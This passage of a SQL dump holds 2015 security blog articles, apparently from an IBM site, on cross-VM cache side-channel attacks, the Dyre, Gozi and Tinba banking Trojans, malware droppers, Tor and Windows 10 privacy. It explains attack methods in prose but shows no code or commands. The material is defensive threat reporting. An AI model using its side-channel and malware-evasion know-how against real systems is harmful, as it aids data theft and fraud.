valuable. Another challenge is constructing an eviction set that only flushes one cache set known to the attacker so that it can be probed. This is difficult because the VMM indirectly maps emulated physical memory to actual physical memory, and the attacker has no way of accessing this mapping. Furthermore, the new slice concept of the LLC in which each core has a fragment of the LLC connected by a ring bus to the other cores makes it necessary to know the slice ID, which is the output of a secret hashing function created by Intel. The solution is to use large memory pages. With 2 MB pages, all the index bits of the LLC fall within the page offset, and this attack becomes practical — that is, the page value is split into two sections, an offset and a page number. This is done to preserve precious entries in the translation lookaside buffer of the CPU. The higher bits assigned as the page number are part of the virtual address space of the process, which is doubly obfuscated both by the processor mapping to emulated physical memory and then by the VMM, which maps it to real physical memory. The lower bits of the virtual address are mapped to a value known as the offset. The offset is not mapped by the memory management unit (MMU) of the CPU and is therefore the same value in physical and virtual memory. This means that bits of the physical address are leaked to the attacker since the offset is not changed. When the attacker uses large pages, more bits are leaked in the offset value that map to physical addresses. The MMU only maps the page number, so with large pages, the number of bits mapped by the MMU grows reasonably small. Because the large page is backed up in physical memory by a large page, this allows access to the LLC. Note that there is still the difficulty of slices. The authors created an algorithm to combat this, the details of which can be found in “Last-Level Cache Side-Channel Attacks Are Practical,” figure 2B. To overcome the limited probing resolution of this technique, the attack can be run asynchronously without the need to preempt the target. This limits the resolution to the speed at which the attacker can execute the probe step. The LLC is much slower than the higher-level caches for several reasons, including more required memory accesses and the physical speed difference of the caches. As I discussed above, cache lines are the lines connecting caches with each other and with the main memory. We must create an eviction set from these cache lines and do so in a manner that is not predictable by the processor’s prefetch unit. The lines of the eviction sets are organized in a random linked list. This avoids processor optimizations such as fetching of contiguous memory lines. Listing 1 of “Last-Level Cache Side-Channel Attacks Are Practical” shows how to probe a cache set. With these tools, the Prime+Probe attack proceeds. See section 4C of the paper for a discussion of optimizations of the attack. In Part III of this series, I will discuss a third side-channel attack.', '\'Advanced Threats\', \'Cloud\', \'Cloud Security\', \'FLUSH+RELOAD\', \'Infrastructure-as-a-Service (IaaS)\', \'Platform-as-a-Service (PaaS)\', \'Side-Channel Attack\', \'Threat Intelligence\', \'Virtual Machine (VM)\'', 'https://securityintelligence.com/side-channel-attacks-against-multicore-processors-in-cross-vm-scenarios-part-ii/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (364, 'The Myth of the Omnipotent Hacker', 'Pamela Cobb', '2015-8-25', 'It’s not uncommon to see a hacker in a movie or a   sitting in a dark basement, frantically typing as he or she simultaneously transfers money from the largest bank in the world, changes traffic lights from green to red to stop the good guys, raises the temperature on a nuclear core and turns off life support for a key character’s beloved family member — all in a 10-minute span. That’s quite a lot of skills for one person to possess and execute in such a short period. Let’s put a pin in the potential time dilation and address the fact that the movie hacker is probably wearing a hoodie. In more extreme movies, hackers wear badass leather trench coats, don dark shades and have hip handles like “Cho$3n0ne.” Recent reports show that   are driven by organized crime. While there are still mischievous lone wolves, the evolution of malware into toolkits or even ransomware-as-a-service, as reported in the latest “ ,” means that collaboration is the new modus operandi for attacks on corporate networks. And although these groups are meeting online in the Dark Web, they are also showing up to an office, working on projects and maybe even sitting in a drab gray cubicle. Let’s get back to that time dilation point. There is every chance that attackers have spent their lives developing skills that enable them to write code that penetrates networks in all sorts of creative ways. Of course, attacks could also be executed by script kiddies with an exploit kit purchased off the  . What television and movies often get wrong, however, is the amount of time it takes to execute a complicated attack and get results. On a good day, I can boot up my computer and log into all my corporate systems in the time it takes to brew a pot of coffee, doctor my cup with cream and sugar and wash the spoon. In that light, being able to affect a multitude of disconnected systems ranging from banking software to elderly SCADA systems in a 10-minute span is about as realistic as learning kung fu by uploading the skills directly to your brain. Even if systems could be affected in near-instant time, the more successful attackers take their time to be stealthy and tiptoe through networks, leaving malware in place and undiscovered for up to 225 days, according to some sources. Imagine how many spoons you could wash while the malware lies dormant in your network! The more data they can siphon out over that longer period, the more hackers maximize their return on investment in developing or buying the malware toolkit. As cybercrime rings are organizing and operating like businesses, the long game makes better business sense. \n My favorite part about movies and television that use these “omnipotent hacker” tropes is that the hacker will often meet his downfall because he made a dumb mistake, like not obfuscating his IP address, either because he didn’t know how or simply forgot to do it. Perhaps his shades and coat are too tight and cut off circulation to his brain? It’s time we stop focusing on “The One” and recognize “The Multitude.” The evolution of collaborative cybercrime necessitates collaborative defense, and as security practitioners and vendors, our skills and defenses can grow through tools like a  . Organizing and collaborating on threat intelligence akin to the collective hive mind that attackers use can help us dodge the bullet of targeted attacks.', '\'Cybercriminals\', \'Dark Web\', \'Hackers\', \'IBM X-Force Exchange\', \'Information Sharing\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/the-myth-of-the-omnipotent-hacker/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (365, 'Anonymity and Cryptocurrencies Enabling High-Stakes Extortion', 'Leslie Horacek', '2015-8-24', 'Today we released the third edition of the “ ,” where we take a deeper look at the evolution of ransomware-as-a-service and how attackers continue to capitalize in this area. Alongside that update, the IBM Managed Security Services (MSS) group reminds us why the   is a threat for enterprises and how companies can better protect themselves. Finally, we provide a brief overview of the latest changes occurring with vulnerability tracking. A quick search across the Security Intelligence site for the word   will reveal a trove of recent blogs in which X-Force researchers have been informing readers about these evolving threats, which continue to net criminals millions of dollars each year. In this third-quarter report, we discuss more of the evolution of ransomware. Not only are a surprising number of users still fooled by fake or rogue antivirus messages that are nothing more than animated Web ads designed to look like actual products, but many cybercriminals are embracing the technical sophistication required to create specialized ransomware that targets specific communities. The Dark Web is an unencrypted, anonymous network used by nefarious individuals and organizations to  , including launching attacks on corporate networks to exfiltrate valuable data. In this report, we examine the genesis of The Onion Router (Tor) software, which enables anonymous communication as both an attack medium and an infrastructure for botnet command-and-control. The design of routing obfuscation in the Tor network provides illicit actors with additional protection for their anonymity. We discuss various methods companies should take to block connections to the Dark Web from their networks in order to limit attack surfaces, as well as liability issues that arise from content originating from Tor nodes. This can include wholesale blocking at the firewall, IDS/IPS technology to flag attacks and developing a corporate policy to stop the creation of Tor relays or similar access nodes to the Dark Web. \n In May 2012, the Board of Directors of the Forum of Incident Response and Security Teams (FIRST) selected IBM as one of the security vendors to participate in the creation of v3 of the  . We highlight some of the critical changes of this updated schema and why it more accurately reflects the scope and impact of modern vulnerabilities. IBM adopted CVSS v3 in July 2015. In the first half of 2015, we reported just over 4,000 new security vulnerabilities. If this trend continues throughout the rest of the year, the total projected vulnerabilities for 2015 would be about 8,000 — the lowest total since 2011. For more information, download the third-quarter   or take a look at some of the other recent reports.', '\'Dark Web\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Information Sharing\', \'Ransomware\', \'Threat Intelligence\', \'Tor\', \'X-Force\', \'X-Force Threat Intelligence Quarterly\'', 'https://securityintelligence.com/anonymity-and-cryptocurrencies-enabling-high-stakes-extortion/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (366, 'Privacy and Windows 10: What’s in Your Settings?', 'Christopher Burgess', '2015-8-24', 'Unless you’ve been totally unplugged for the past month, you are aware that Microsoft has rolled out the long-awaited   operating system (OS). Users of the Windows 7 and 8 OSs were offered free upgrades, which they received via their update feature within their current OS.\n Accompanying the update and installation of Windows 10 was a new and comprehensive  . The privacy statement outlines what, how and when Microsoft captures your data during your use of Windows 10. It’s an interesting read, but it’s matched by some curious new capabilities. One of the new features of Windows 10 is Wi-Fi Sense, which allows users to connect to others’ wireless networks and permits their friends and social network contacts to connect to the wireless networks that the user controls.\n  is able to provide to Microsoft volumes of information about how you use the operating system, the problems encountered and more. That’s not necessarily a bad thing from either the user’s or Microsoft’s perspective — as long as both parties have a handle on what is being shared and when, which the company is encouraging.\n “You can view or edit your personal data online for many Microsoft services,” the July 2015 privacy statement notes. “You can also make choices about Microsoft’s collection and use of your data. How you can access or control your personal data will depend on which services you use.”\n For some it will be as easy as programming your television’s remote control, but for others it will seem like the equivalent of launching NASA’s Apollo program. The key is in dissecting the massive privacy document and then finding where the toggles to control the various features are located, which will permit you to opt out of automated monitoring of your actions.\n For example, according to Microsoft’s privacy statement, “When you use Bing services, we collect your search queries, location and other information about your interaction with our services.” From a corporate perspective this may or may not be a competitive intelligence risk, but each company’s threshold and use of Internet search capabilities are different.\n Another feature is the ability to commingle your personal and business content via the OneDrive service. “OneDrive lets you store and access your files on virtually any device. You can also share and collaborate on your files with others,” Microsoft’s privacy statement notes.\n “Some versions of the OneDrive application enable you to access both your personal OneDrive by signing in with your Microsoft account and your OneDrive for Business as part of your organization’s use of SharePoint Online.” That’s an absolute convenience for some companies and an unmitigated security risk for others.\n The Wi-Fi Sense feature of Windows 10 has received a good deal of publicity — some  , most  . The feature will clearly make it a breeze for visitors (friends) to connect to networks without the hassle of having to issue user IDs and passwords. And according to the documentation and screen shots, you or your friends can “give and get Internet access without seeing shared passwords.” Yes, there is a “but” coming: Do you want your Facebook or Skype contacts connecting to your networks automatically, without the ability to do some configuration and/or limitation?\n   \n The settings are available for you, the user, to decide. For you personal network, perhaps you are comfortable with the knowledge that your social network friends will have access when they are in proximity to your network — that is, physical proximity. For your work  , perhaps you need to have a different standard and may choose to not allow others to connect to open hot spots, especially if a potential friend is an employee of a competitor. The key in this instance is to know when and how you are sharing connectivity. When in doubt, turn those two switches off.\n In sum, the days of simply plug-and-play are long gone. Now we must knuckle down and know what we are sharing and the context in which we are sharing access or information. For devices being used within an employer’s bring-you-own-device (BYOD) policy, your Windows 10 implementation and settings may end up putting you at cross purposes with your employer’s information security policies and procedures.', '\'Microsoft\', \'Privacy\', \'Wi-Fi\', \'Windows 10\'', 'https://securityintelligence.com/privacy-and-windows-10-whats-in-your-settings/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (367, 'Spotting the Trouble Ahead With Proper Visibility Into Your Network', 'Kevin Beaver', '2015-8-21', 'You don’t know what you don’t know; that seems to be the mantra for most information security programs today. Security visibility is grossly lacking in so many environments. For many, this ignorance — and the ensuing lack of security alerts — is bliss.\n I’ve seen it time and again: Management, including  , intentionally avoid acknowledging or properly addressing the information security weaknesses — or even breaches — impacting their business. On the opposite end of the spectrum, others struggle to keep up with and determine what’s going on because of too much information, a lack of expertise or the improper use of existing security tools. Sometimes it’s all three.\n I’ve yet to see an IT environment where those in charge truly understand the state of security at any given moment. I think that’s why we keep seeing the   come in. Regardless of where your organization falls within the spectrum of security visibility and control, the reality is that someone can be doing something bad on your network at this very moment. And odds are good that you don’t even know about it.\n Then what happens? Maybe you’ll detect the breach eventually. Perhaps you’ll be lucky enough to be notified by someone else, which, according to studies such as the “ ,” is a common scenario. It could be that you never find out and long-term damage is inflicted over time, hurting your bottom line and your brand reputation.\n These security challenges impact both small and large enterprises and even the  . It’s interesting — I’ve heard stories from security vendors who say that they will demo their product in a customer environment for proof of concept to show   and related criminal activity in the networks, yet a common response is: “Thanks, Mr. Vendor. We appreciate the insight and will put your product in our budget for next year.” So an intruder is in the house, but people will pretend like nothing bad is happening.\n No matter the scenario, the fines, lawsuits, discovery requests and depositions will likely ensue, especially if personally identifiable information (PII) is breached. There are also the long-term costs associated with stolen intellectual property, impact to your brand and so on. Is this a challenge that management is willing to take on?\n You don’t know what you don’t know, but that’s not a defensible approach to information security. Heads in the sand never helped anyone. If you’re going to stay out of trouble, you have to find out what’s happening on your internal  , across your mobile workforce and in the cloud. Then, when threats, vulnerabilities and risks are identified, vow to do something about them in the very near future, if not immediately. Criminals attacking your business have nothing but time. You don’t.', '\'Cybersecurity\', \'Endpoint Security\', \'Network Security\'', 'https://securityintelligence.com/spotting-the-trouble-ahead-with-proper-visibility-into-your-network/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (368, 'Side-Channel Attacks Against Multicore Processors in Cross-VM Scenarios: Part I', 'Brad Harris', '2015-8-21', 'The following discussion is meant to facilitate the understanding of side-channel attacks that affect today’s modern multicore processors. Side-channel attacks leverage the side effects of the execution of code. In this discussion, I will cover channels available through shared hardware devices such as processors, hard disk controllers or shared physical memory. Specifically, our focus will be on side channels in the last-level shared cache of Intel CPUs. There are several types of side-channel attacks. One type that has received popular coverage is based on a technique called  . This technique is a statistical method through which a black-box analysis of an unknown cryptographic hardware device can be used to discover secrets and intermediate cryptographic values via their power consumption. However, there are several other side-channel attacks that rely upon some knowledge of the system under test. This is not as limiting as it might seem. For example, microprocessor specifications are available through the Hardware Reference documentation available from most manufacturers. I will discuss these side-channel attacks, which exploit knowledge of the underlying architecture in order to leak secrets from a virtual machine (VM) located on a CPU to another VM located on that same CPU. Note that this does not mean the same core, but rather the same processor package. This scenario often arises in cloud computing when physical resources are shared among customers, called tenants. The storage technique is common on clouds because it allows the provider to use its physical resources in the most efficient manner possible. Infrastructure-as-a-service (IaaS) clouds offer scalability of servers or other resources based upon the demand from the tenant. To respond to these demands, the cloud provider will launch VMs on its compute nodes, or physical computers. These VMs can either be on the same compute node or they could be geographically separated onto different compute nodes. In order to protect one tenant’s resources from another on the same compute node, cloud providers rely upon the virtual machine monitor (VMM), or hypervisor. The VMM is responsible for protecting each tenant from exposure, whether accidentally or intentionally, to other tenants on the same compute node. It is this logical isolation that would be defeated via side-channel attacks. There are other types of clouds, as well.   are generally Web servers or other hosted servers that allow users to share common binaries and environments. Everyone has access to the same software, and the isolation is generally performed through Linux containers rather than full VMs. They also share the same kernel, as well as all the write-protected shared memory pages, so that pages do not have to be duplicated from one container to the next. For example, they share the same libc for Unix. The PaaS attack uses a strike against the shared last-level CPU cache but exploits this deduplication. The attacks against IaaS clouds, which use VMs for isolation, are by necessity more complex because one must find shared resources across VMs. In these attacks, the shared resource will be the CPU’s last-level cache, which is shared across VMs as well as CPU cores. Note that while   also use this feature, attacks against IaaS must be more sophisticated. The first attack against the IaaS clouds is the same attack used against PaaS clouds. But, as I will describe, it is much more complex in the IaaS case; in fact, it’s often impossible. PaaS attacks, on the other hand, makes this attack trivially simple when Linux containers are used. The attacks below assume that there is at least one (but usually several) attacker VMs controlled by the adversary, and at least one (but usually more) target VMs belonging to the cloud tenant under attack. In order for the attacks to succeed, the adversary must have at least one VM located on the same compute node and physical CPU (not the same core, but the same processor package) as the target. Note that this has been demonstrated to be possible in   of the experimental trials conducted. In these trials, the experimenters used a covert channel to identify whether they were a co-resident on the same machine, but this could be done by means of OS fingerprinting, network probes and even the side channel itself by stimulating a behavior in a target and searching for telltale signs of the activity, such as timing variations in code execution. Because of this, some commercial cloud providers are offering guarantees that one tenant will be allocated a set of resources to themselves,   tenant. Once co-residency has been achieved between an attacker VM and a target VM, there are several side channels that may be employed by the attacker to obtain information from the target. The most successful have been based on the CPU’s cache. Multiple cores can complicate this attack since each core has its own cache. However, in Intel CPUs the cores share what is called the last-level cache (LLC). The LLC is much larger than the caches on the cores themselves. This complicates attacks, as does its slower speed. I will discuss three attacks aimed at multicore CPUs, which are finely grained enough to discover cryptographic secrets. Given this resolution, other secrets are certainly possible to obtain, but cryptographic secrets such as private keys are often the best protected and most sensitive secrets in the target VM. Once again, any secret on your cloud instance can be obtained if the conditions are right. These side-channel attacks can exploit any execution timings to obtain any secret that your cloud VM processes. Find out how your   could be leaked to an attacker in Parts II and III of this series.   reviews attacks against El Gamal and RSA encryption in more depth, while Part III covers the attack that can recover an AES key in two minutes.', '\'Advanced Threats\', \'Cloud\', \'Cloud Security\', \'Infrastructure-as-a-Service (IaaS)\', \'Platform-as-a-Service (PaaS)\', \'Side-Channel Attack\', \'Threat Intelligence\', \'Virtual Machine (VM)\'', 'https://securityintelligence.com/side-channel-attacks-against-multicore-processors-in-cross-vm-scenarios-part-i/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (369, 'Dyre Summer Renovation: Randomized Config File Names Keep Antivirus Engines Guessing', 'Or Safran', '2015-8-20', 'How many malware builds would you guess Dyre compiled and spammed out recently?   researchers have counted no less than nine different malware builds with actual code changes spread by this highly active crimeware project — and that’s in the past week alone. The Dyre Trojan is an ever-evolving advanced threat. While most of the time its modifications are minor, our recent research indicates the malware is doing some summer renovation in the code with the purpose of keeping it more elusive and stealthy. At this time, there are two principal changes worth noting for  : First, it has moved its run key from the Windows Registry, turning it into a scheduled task. The Registry still contains the instructions, but files run by the scheduler can be found in a preset Windows Tasks folder, where they are fetched as needed. By turning Dyre’s run into a scheduled task, it becomes more resilient to deletion by the user or security products. But it also gives its developer the flexibility to decide when to run and how often, or upon which type of OS event to rerun the malware file. The second change is the randomization of Dyre’s configuration file name using a naming algorithm, most likely in order to trick antivirus engines that may be automatically finding and deleting it from infected PCs. The most likely reason for this change in approach is to keep the configuration away from automated security products that search for the file and then delete or quarantine it. For this change, Dyre’s developer prepared a mathematical manipulation designed to create a different file name every time but a constant one for the same user. To do that, Dyre uses the machine’s name and the user’s name as its main parameters and concatenates them. It then takes that alphanumeric string and performs a hashing operation on it (SHA-256), then processes the result into a new string. These changes show that advanced and active malware like   that changes constantly to evade static security and maintain its foothold in infected endpoints. The next section of this post describes some of the technical details related to these changes. Until a few weeks ago, these non-admin installations had Dyre register a run key in the Windows Registry, designed to have it automatically run as soon as the computer is rebooted by the user: \n This element was changed in Dyre’s more recent builds. The malware’s developer modified this persistence mechanism and programmed Dyre as a scheduled task in the Registry. The commands used for running Dyre’s   are: According to the task’s configuration, Dyre is currently defined to rerun every single minute! The code below shows the parameters that define the run, where   stands for the executable’s file name and   stands for its location. In the recent changes implemented by Dyre’s developers, the configuration name creation begins after the malware’s main thread is injected. That is the point where it calls on a function named  . At this point, Dyre attempts to locate the endpoint’s name and the active username on that machine. Since this operation does not succeed in 100 percent of the cases, Dyre has a fallback mechanism to just skip the process and use the letter   as the name of the endpoint. Once Dyre has the initial string concatenated, it calculates its length, then calls on a   function. Now, the string’s numeric value and the number of times it’s set to replicate the same manipulation can be set up. As of the time of writing this report, Dyre repeats the same mathematical manipulation three times. The   function calculates a standard SHA-256 hash function followed by a short mathematical manipulation, which is then followed by the next hashing. Dyre adds one to the ASCII value of the byte — for example,   will become  . It concatenates it to the first 16 bytes of the string. It will call the SHA-256 hash function once more and repeat the process three times. After the triple hashing, the malware takes four parts of the last hash, which is eight characters. Those serve as the configuration file’s name. Let’s take an example where the endpoint name is   and the user name is  . The process is case-sensitive. The first SHA-256 hash of this combination would be: \n Adding one to that: \n The second SHA-256 hash: \n Adding one again: \n The third SHA-256 hash: \n Adding one for the last time: \n Final SHA-256 hash: \n At this point, Dyre takes 4 bytes each time and changes that string’s — the sequencing of bytes of a word of digital data — a few times until it has a 16-byte string. The resulting semirandom alphanumeric string is the configuration file’s name: \n Knowing the hashing process makes it possible to recalculate and know whether the machine has a Dyre configuration on it. According to IBM Security X-Force research, Dyre’s developers are keeping close tabs on security. They constantly evolve the malware in both major changes and semantic modifications to ensure the Trojan is not detected by standard security products and static detection mechanisms. Dyre is considered the most advanced banking malware in the wild. It is used for broad-stroke financial attacks on banking customers and in the targeted heists of corporate accounts measured in millions of dollars, which IBM Security previously reported as  . Most recently, Dyre was seen adding a number of  . Dyre’s most targeted geographies in the past 60 days appear in the chart below. North America is the main focus, followed by Europe and Asia-Pacific.', '\'Advanced Threats\', \'Dyre\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/dyre-summer-renovation-randomized-config-file-names-keep-antivirus-engines-guessing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (370, 'Diagnosing the Details of a Malware Infection', 'Etay Maor', '2015-8-20', 'We are constantly reading of targeted attacks and personal home computers being under the threat of malware infection. While these occurrences may sound like a single event, in reality, a malware infection encapsulates multiple stages that have been developed and perfected over the years to ensure success, persistence, survival and invisibility. Once a device is compromised by a dropper and a downloader, the payload can be anything from financial malware to remote access tools (RATs),  , spamming software or others. A critical step of the malware infection process is the dropper. The dropper is the spearhead of the malware infection; it is a small piece of software that clears the path for the payload. Droppers will use multiple techniques to evade detection by endpoint security products such as antivirus programs, corporate security products such as sandboxes and other evasion tools used by researchers. As those security researchers perfected their methods of detecting and analyzing malware, the malware authors realized they needed to invest time and effort into protecting their malicious programs from detection tools. This includes developing techniques to evade virtual environments, avoid   that have a research profile — the existence of reverse engineering tools and communication analysis is just one example — and even attempt to trick sandbox solutions with elaborate sleep techniques, human interaction detection and log file overloading. Once the dropper completes its part, a payload can be safely delivered to the targeted system. This may include a downloader that will allow the attacker to download any piece of malware to this device in the future. This enables cybercriminals to also sell such controlled devices via a pay-per-infection method. \n There is much more to the malware infection process, including preparation stages such as creating an infection point and using spammers to lure victims. Those entryways can be drive-by infection points, emails with weaponized content and more. There’s plenty happening post-infection as well, including multiple modules that can manipulate online sessions, allow remote access and perform an analysis of the infected device. As   keep getting more sophisticated and aggressive in their detection and remediation capabilities, we can only expect the droppers, downloaders, packers and other modules in the malware infection process to evolve and adjust. For more information on the evolving malware ecosystem, watch the video below:', '\'Advanced Threats\', \'Malware\', \'Threat Intelligence\', \'Threat Protection\'', 'https://securityintelligence.com/diagnosing-the-details-of-a-malware-infection/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (371, 'Gozi Goes to Bulgaria — Is Cybercrime Heading to Less Charted Territory?', 'Limor Kessem', '2015-8-18', 'In what  , another banking Trojan is  ready to attack in Eastern Europe. This time it is the Gozi/ISFB Trojan, which just added 9 major banks in Bulgaria to its list of targets. In early-August 2015, IBM Security X-Force researchers analyzed a new Gozi Trojan configuration file that is, according to our data, the first one dedicated to exclusively targeting Bulgarian banks. Previous versions of this malware attack in the US, UK, AU, as well as Saudi Arabia and the Persian Gulf, but this is a first for Bulgaria. Our analysis reveals that Gozi’s developers have expanded the capabilities and reach of the malware by updating its web injections to match the Bulgarian banks they are targeting. When it comes to cybercrime, rather than being a popular target, Bulgaria is   for its locally-based perpetrators, making the headlines in cases of  ,  ,   and the like. In a fraud update   by the European ATM Security Team (EAST), Bulgaria was named as home to a “significant Bulgarian organized crime network suspected of a variety of crimes including large scale ATM skimming, electronic payment fraud and forgery of documents.” \nAs a victim of cybercrime, Bulgaria is not often on the attackers’ roster, and losses the country incurs as a result of cyber-borne threats are not widely documented. The most common issue banks suffer from in Bulgaria is accounts used as money mules to withdraw and launder funds that come from other countries. The most recent mention of banks in Bulgaria suffering cybercrime losses appeared when the Bulgaria’s Chief Directorate for Combating Organized Crime, Vasil Petkov,   as saying, “Fortunately, cybercrime in Bulgaria is not world-class, perhaps because the cybercriminals do not see a big target here.” But the country still experiences some cybercrime and ransomware attacks, and its businesses are targeted for their corporate bank accounts. With Gozi tuning up its configuration to begin attacking Bulgaria, are things starting to change? Earlier this year, in a meeting with the director of the FBI, the Bulgarian prime minister agreed that   are a growing problem in the country. This may just be a sign that things are indeed heating up. The Gozi Trojan, also known as ISFB and Ursnif, is one of the longest-standing banking Trojans in the wild today. It was first discovered in 2007, when it was operated by a closed group of malware developers and fraudsters for online banking wire fraud, mostly targeting English-speaking countries. In September 2010, Gozi’s original source code (ISFB) was unintentionally leaked by one of its developers when the team was working on a major version upgrade they were going to name Gozi v2. Original Gozi v2 variants started appearing in the wild towards the end of 2010, using new webinjection mechanisms that were developed to attack European and American banks. The leaked ISFB code was further repurposed to build the Vawtrak/Neverquest evolution of this malware. In 2012, an apparently proprietary version of Gozi was used in the widely publicized  . For the past five years, Gozi v2’s developers have been escalating its pervasive techniques and the methods it uses to inject social engineering into banks’ online pages. Current Gozi variants show consistent evidence that the project is very much alive, and it’s frequently modified for new capabilities and methods to circumvent security in the online service channels. \n So what’s sparking cybercriminals’ rising interest in targeting Easter European countries? Financially motivated cybercriminals are most known for their broad-stroke attacks, where they can tailor their spam and wares to as large a population as possible at one time. Attacks in English speaking countries are therefore rampant both because of the common language, and also because their currency can be more attractive. So how come now malware like Tinba and Gozi turn in a less expected direction, targeting linguistic areas that only apply in one place, and where accounts are less likely to be replete with cash. In cybercrime things are sometimes simpler than they seem: fraudsters always take the path of least resistance. If they have been tackling very advanced fraud protection measures in the U.S. and the U.K., they may very well be testing out their ability to rob bank accounts in territories that are perhaps less protected, or less experienced dealing with advanced malware. According to IBM Security data, the configurations that come from the Gozi variation that plans to attack Bulgarian banks began showing up in early August 2015. It did not target Bulgaria up until that point. A look into past attacks by the same Trojan shows that since the beginning of 2015, Gozi’s most intent focus remains the USA and the UK, but it began adding new target territories in March and July 2015. According to historical configurations, Gozi’s operator may begin by adding one target bank from a new country it is aiming at, test it for a few months, and then expand the list considerably later down the line. For example, in Saudi Arabia Gozi used to only target one bank, then in July 2015 it expanded its Saudi-targeting list to 15 different targets. Will Gozi be applying the same method to Bulgaria? Only time will tell, but Gozi definitely has plans for Eastern Europe since it also added triggers for a small number of banks in Latvia in early July. \n With  , financial organizations gain access to a real-time malware intelligence network that provides insight into fraudster techniques and capabilities, much like this malware’s expansion into new territories. This global threat intelligence serves as the foundation for IBM Security Trusteer automated threat protection capabilities, and is used by IBM Security experts to help develop and deliver new protections for organizations like yours. At IBM, a research and development (R&D) team of security experts scrutinizes threat intelligence as it arrives from both Trusteer-protected endpoints, as well as underground cybercrime venues. IBM Security Trusteer solutions use this intelligence to deliver flexible protection layers that can be rapidly configured and updated by IBM R&D staff. As a result, as soon as new threats emerge or mutate, new countermeasures are automatically deployed back into Trusteer software without any intervention by bank security staff and without any noticeable impact to banking customers.', '\'Banking Trojan\', \'Gozi\', \'Gozi Trojan\', \'IBM Security Trusteer\', \'IBM X-Force Research\', \'Threat Intelligence\'', 'https://securityintelligence.com/gozi-goes-to-bulgaria-is-cybercrime-heading-to-less-chartered-territory/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (372, 'Tinba Trojan Sets Its Sights on Romania', 'Limor Kessem', '2015-8-12', 'While Romania is widely suspected of being home to a large amount of cybercriminals – even with one city dubbed by some as “ ” — we seldom see it targeted by those who attack Western countries. In a recent finding, IBM Security X-Force researchers discovered an interesting Romania-focused configuration of the Tinba v3 Trojan, which exclusively targets 12 Romanian banks. In late July 2015,   researchers analyzed a new Tinba v3 Trojan configuration file that is, according to our data, the first of its kind dedicated to Romanian banks. Previous versions of this malware attacked a number of European countries, but Romania wasn’t among them and is rarely a top target. Our analysis reveals that Tinba v3’s developers have expanded the capabilities and reach of the malware by updating its webinjections to match the new banks targeted in the Eastern European country. The   (also known as TinyBanker or Zusy) was first discovered in the wild in mid-2012. It was dubbed “tiny” due to its slim 20 KB file size, which included its configuration and webinjection kit. This malware initially acted like a classic banking Trojan, dedicated to grabbing user credentials and network traffic. The first Tinba release sported a form grabber to steal usernames and passwords and a webinjection mechanism for man-in-the-browser (MitB) attacks. Although it started out as a tool used exclusively by its developers and their gang, its source code was leaked in mid-2014, and the project then began evolving in other directions. That code leak gave immediate rise to two more Tinba variations, which were taken up by different gangs, spawning Tinba v2 and Tinba v3. Each is a fully independent Trojan variation, clearly developed and updated by different individuals. The most recent addition to the Tinba bunch is a fourth variation. Again, a new gang took the source code and revamped it to create a unique banking Trojan. In late June 2015, this gang lured in victims via a  , which led users to an exclusive exploit kit called HanJuan. HanJuan then dropped Tinba 4, the actual banking malware. Of all the Tinba variations, v3 appears to be the most active and possibly commercially available. It is more prolific and appears to be used by more than one group. \n The configuration that targets Romanian banks at this time is linked with Tinba v3. Right from its first release, this variation showed that the developer behind it put some work into new features designed to enhance the Trojan’s evasion techniques, bypass automated security controls and “phone home,” even when the original command-and-control (C&C) server is down. Botmasters typically strive to protect their botnets from potential hijacking and takedowns, and Tinba v3’s developer took extra care to ensure that its fallback mechanisms would secure the illicit business continuity. In terms of its modus operandi, Tinba v3 relies on four principal  : Tinba v3 uses a few browser injection approaches. For example, the Trojan works with an automated transfer system (ATS) panel. ATS is fraudster lingo for a remote platform that Trojans access on the fly. The ATS contains transaction automation scripts, preprogrammed parameters and thresholds and mule account numbers that the malware relies on to complete illicit online transactions. ATS was much more popular before two-factor authentication schemes came into the equation, but it is still effective in this case. The panels used by Tinba include dynamic social engineering designed to ask for the victim’s one-time password and then plug it into the bank’s page to complete the transaction. Another common webinjection approach Tinba v3 uses in its configurations is called FI-Grabber, short for full information grabber. This is lingo for an injection that asks the victim to key in a large amount of personally identifiable information (PII) and other private details about the account. These grabbers are accessed on a remote server and automatically match the most relevant injection to the bank the victim is browsing. FI-Grabbers are actually a paid cybercrime service that promises effective injections leading to a successful transfer. This all happens in real time and without exposing the Trojan’s actual injections inside the configuration file. Reaching out to an FI-Grabber is considered to be a more advanced means of manipulating Web sessions while still keeping the Trojan’s secrets under wraps. The malware’s fraud scenario is similar to other Trojans of this grade: collect victims’ credentials, grab PII and use social engineering to steal two-factor authentication codes. Actual illicit transactions generated from Tinba-infected users typically come from the victim’s own device, which is indicative of the use of automation after the victim keys in the one-time password. Tinba-enabled illegitimate online banking operations take place via a remote transaction orchestration panel. In terms of Tinba’s proliferation this year, IBM Security data shows that this malware is ranked sixth in popularity. It is right behind  , which is considered commercial malware. Tinba v3 attacks online banking customers all over  , mainly targeting Poland, Italy, Germany and the Netherlands. Per IBM Security X-Force data, this is the very first time we identified any of the Tinba variations attacking in Romania. Based on other Tinba v3 campaigns that IBM Security is familiar with, we expect to see more Tinba attacks in Romania going forward. The country may only be starting to face Tinba, but it is already plagued by the Dridex Trojan, Dyre, Neverquest and Zeus v2 variants. IBM Security data shows that, since the beginning of 2015, the most active Trojan in Romania is Dridex, but that could stand to change if Tinba accelerates its activity. Since Tinba v3 webinjections are designed to harvest large amounts of personal information as well as two-factor authentication codes during the Web session, IBM Security recommends that banks alert their customers of the threat and refresh the online banking security education sections of their websites. Romanian banks should ask customers to report 